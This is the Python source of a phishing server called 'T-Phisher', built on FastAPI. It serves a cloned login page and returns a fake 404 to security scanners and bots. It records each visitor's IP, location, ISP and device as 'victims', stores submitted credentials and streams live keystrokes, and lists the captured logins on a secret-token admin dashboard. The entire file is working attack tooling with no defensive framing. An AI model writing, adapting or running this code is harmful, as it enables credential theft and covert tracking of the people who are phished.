import os
import secrets
import datetime
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
from colorama import init, Fore, Style

from core.fingerprint import is_bot, parse_user_agent, get_ip_geolocation
from database.models import init_db, VictimSession, CredentialLog

init(autoreset=True)

app = FastAPI(title="T-Phisher Elite Engine", version="2.1.0")

CURRENT_SESSION_ID = "default_session"
ADMIN_SECRET_TOKEN = secrets.token_hex(4)
SESSION_DB = None
TARGET_URL = "https://example.com"

@app.get("/", response_class=HTMLResponse)
async def serve_cloned_page(request: Request):
    client_ip = request.client.host if request.client else "Unknown"
    forwarded = request.headers.get("x-forwarded-for")
    if forwarded:
        client_ip = forwarded.split(",")[0]
        
    ua = request.headers.get("user-agent", "")
    
    if is_bot(ua):
        print(f"{Fore.RED}[!] Bot detected and blocked: {Fore.YELLOW}{ua[:60]}... (IP: {client_ip})")
        return HTMLResponse(content="<h3>404 Not Found</h3>", status_code=404)
    
    fp = parse_user_agent(ua)
    geo = await get_ip_geolocation(client_ip)
    
    if SESSION_DB:
        try:
            db = SESSION_DB()
            session_entry = VictimSession(
                session_id=CURRENT_SESSION_ID,
                ip_address=client_ip,
                country=geo.get("country", "Unknown"),
                isp=geo.get("isp", "Unknown"),
                os_info=fp["os"],
                browser_info=fp["browser"],
                device_type=fp["device"]
            )
            db.add(session_entry)
            db.commit()
            db.close()
        except Exception as e:
            print(f"DB Error: {e}")

    print(f"\n{Fore.GREEN}[+] TARGET HIT DETECTED! ===>")
    print(f"{Fore.CYAN}    IP Address  : {Fore.YELLOW}{client_ip} ({geo.get('country')})")
    print(f"{Fore.CYAN}    ISP         : {Fore.WHITE}{geo.get('isp')}")
    print(f"{Fore.CYAN}    Device Type : {Fore.WHITE}{fp['device']}")
    print(f"{Fore.CYAN}    OS / Browser: {Fore.WHITE}{fp['os']} / {fp['browser']}")
    print(f"{Fore.CYAN}    User-Agent  : {Fore.WHITE}{ua}")
    print(f"{Fore.CYAN}    Timestamp   : {Fore.YELLOW}{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}\n")
    
    target_file = os.path.join("templates", "cloned.html")
    if os.path.exists(target_file):
        with open(target_file, "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
            
    return HTMLResponse(content="<h2 style='color:red;'>Error: Cloned payload missing.</h2>")

@app.post("/api/submit")
async def receive_submission(request: Request):
    try:
        data = await request.json()
    except Exception:
        data = {}
        
    if SESSION_DB:
        db = SESSION_DB()
        
        for field, value in data.items():
            log = CredentialLog(
                session_id=CURRENT_SESSION_ID,
                field_name=str(field),
                field_value=str(value)
            )
            db.add(log)
            print(f"\n{Fore.MAGENTA}[+] CREDENTIAL / INPUT CAPTURED:")
            print(f"{Fore.CYAN}    Field : {Fore.YELLOW}{field}")
            print(f"{Fore.CYAN}    Value : {Fore.GREEN}{value}{Style.RESET_ALL}\n")
        db.commit()
        db.close()
        
    return JSONResponse(content={"status": "success", "redirect": TARGET_URL})

@app.post("/api/keystroke")
async def receive_keystroke(request: Request):
    try:
        data = await request.json()
        field = data.get("field", "unknown")
        value = data.get("value", "")
        
        print(f"{Fore.BLUE}[LIVE KEYSTROKE] {Fore.CYAN}{field} ➔ {Fore.WHITE}{value}")
    except Exception:
        pass
    return JSONResponse(content={"status": "logged"})

@app.get("/admin/{token}", response_class=HTMLResponse)
async def admin_dashboard(token: str, request: Request):
    if token != ADMIN_SECRET_TOKEN:
        raise HTTPException(status_code=403, detail="Access Denied: Invalid Security Token")
        
    if not SESSION_DB:
        return HTMLResponse(content="<h3>Database not initialized.</h3>")
        
    db = SESSION_DB()
    sessions = db.query(VictimSession).filter_by(session_id=CURRENT_SESSION_ID).all()
    credentials = db.query(CredentialLog).filter_by(session_id=CURRENT_SESSION_ID).all()
    db.close()
    
    html = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>T-Phisher Secure Command Center</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <meta http-equiv="refresh" content="3">
    </head>
    <body class="bg-slate-950 text-slate-100 min-h-screen p-8 font-sans">
        <div class="max-w-6xl mx-auto">
            <h1 class="text-3xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-red-500 to-amber-500 mb-2">
                T-PHISHER // INTELLIGENCE SUITE
            </h1>
            <p class="text-slate-400 text-sm mb-8">Active Session ID: <span class="text-cyan-400 font-mono">{CURRENT_SESSION_ID}</span></p>
            
            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
                <div class="bg-slate-900 border border-slate-800 p-5 rounded-2xl shadow-xl">
                    <h2 class="text-lg font-bold text-red-400 mb-4">🎯 Target Victims & Deep Devices</h2>
    """
    
    if not sessions:
        html += '<p class="text-slate-500 text-sm">No hits recorded yet.</p>'
    else:
        for s in sessions:
            html += f"""
            <div class="bg-slate-950 p-4 rounded-xl border border-slate-800 mb-3 text-xs font-mono">
                <div class="text-red-400 font-bold">IP: {s.ip_address} ({s.country})</div>
                <div class="text-slate-300 mt-1">ISP: {s.isp}</div>
                <div class="text-cyan-400 mt-1">Device: {s.device_type} | OS: {s.os_info}</div>
                <div class="text-amber-400 mt-1">Browser: {s.browser_info}</div>
                <div class="text-slate-500 mt-1">{s.timestamp}</div>
            </div>
            """
            
    html += """
                </div>
                <div class="bg-slate-900 border border-slate-800 p-5 rounded-2xl shadow-xl">
                    <h2 class="text-lg font-bold text-emerald-400 mb-4">🔑 Captured Credentials & Inputs</h2>
    """
    
    if not credentials:
        html += '<p class="text-slate-500 text-sm">No credentials captured yet.</p>'
    else:
        for c in credentials:
            html += f"""
            <div class="bg-slate-950 p-4 rounded-xl border border-slate-800 mb-3 text-xs font-mono">
                <div class="text-cyan-400 font-bold">Field: {c.field_name}</div>
                <div class="text-emerald-300 text-sm font-bold mt-1">Data: {c.field_value}</div>
                <div class="text-slate-500 mt-1">{c.timestamp}</div>
            </div>
            """
            
    html += """
                </div>
            </div>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(content=html)